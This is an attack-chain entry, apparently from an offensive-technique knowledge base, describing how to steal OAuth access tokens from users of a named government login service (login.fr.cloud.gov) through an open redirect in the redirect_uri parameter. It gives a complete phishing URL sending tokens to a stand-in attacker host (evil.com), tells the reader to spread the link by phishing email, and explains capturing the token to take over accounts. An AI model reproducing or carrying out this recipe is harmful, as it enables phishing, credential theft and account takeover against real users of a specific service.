---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
tags:
  - oauth
  - open-redirect
  - token-leak
  - account-takeover
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Craft-Malicious-OAuth-Authorization-Link]]'
  - '[[procedures/Authenticate-via-OAuth-to-Leak-Access-Token]]'
step_count: 2
techniques:
  - '[[T1566.002]]'
  - '[[Steal Application Access Token]]'
updated_at: '2025-12-14T17:24:38.864Z'
description: >-
  Multi-stage attack exploiting an open redirect vulnerability in the OAuth
  authorization endpoint to leak access tokens and enable account takeover.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
mitre_techniques:
  - '[[T1566.002]]'
  - '[[Steal Application Access Token]]'
---
# OAuth Access Token Leakage via Open Redirect in redirect_uri Parameter

Multi-stage attack chain demonstrating a complete attack workflow exploiting an open redirect in the OAuth redirect_uri parameter to steal access tokens from .gov accounts.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Craft Malicious Link] --> B[Victim Authentication]
    B --> C[Token Leakage and Account Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (manual crafting and browser-based execution)

### Target Environment

- Web platform with OAuth 2.0 authorization endpoint at https://login.fr.cloud.gov/oauth/authorize
- Identity provider at https://idp.fr.cloud.gov
- Attacker-controlled domain (e.g., evil.com) for receiving leaked tokens

### Initial Access Requirements

- No prior credentials needed; relies on social engineering to trick victim into clicking the link
- Network access to the target OAuth endpoint
- Control over a domain to host the callback endpoint

## Detailed Attack Procedures

### Step 1: Craft Malicious OAuth Authorization Link
procedure: [[procedures/Craft-Malicious-OAuth-Authorization-Link]]

**Objective**: Create a phishing link that exploits the open redirect in the redirect_uri parameter to direct the victim to an attacker-controlled site after authentication.

**Instructions**: Manually construct the OAuth authorization URL with a malicious redirect_uri pointing to your controlled domain. Use URL encoding for the redirect_uri parameter. Example construction:

- Base URL: https://login.fr.cloud.gov/oauth/authorize
- Parameters: client_id=███ (use a valid client ID if known, or test with defaults), response_type=token, redirect_uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback (URL-encoded), state=███ (optional for CSRF protection)

Full link: https://login.fr.cloud.gov/oauth/authorize?client_id=███&response_type=token&redirect_uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback&state=███

Distribute this link via phishing email or other social engineering.

**Expected Output**: A clickable link that, when accessed, presents the OAuth login page.

**Success Indicators**:
- Victim receives and clicks the link
- OAuth authorization page loads without errors

### Step 2: Authenticate via OAuth to Leak Access Token
procedure: [[procedures/Authenticate-via-OAuth-to-Leak-Access-Token]]

**Objective**: Trick the victim into authenticating, causing the access token to be appended to the redirect URL and sent to the attacker-controlled site.

**Instructions**: Once the victim clicks the link from Step 1, they will be prompted to log in. Guide or observe (in a controlled test) the victim selecting a .gov account and completing authentication via the identity provider. Upon success, the server redirects to the malicious redirect_uri with the access token in the URL fragment (e.g., evil.com/auth/callback#access_token=TOKEN_VALUE).

Monitor your attacker-controlled site (evil.com) to capture the incoming request containing the leaked token.

**Expected Output**: Redirect to evil.com with OAuth access token visible in the URL (e.g., #access_token=eyJ...).

**Success Indicators**:
- Access token received on attacker site
- Token can be used to access victim account APIs, confirming takeover

## Attack Chain Summary

### Key Achievements

1. Successful exploitation of open redirect to bypass redirect validation
2. Leakage of sensitive OAuth access token to external domain
3. Enable full account takeover using the stolen token

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[T1566.002]] Spearphishing Link
- [[Steal Application Access Token]] Steal Application Access Token

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Credential Access]] Credential Access

---
*Last updated: 2023-10-01T00:00:00Z*
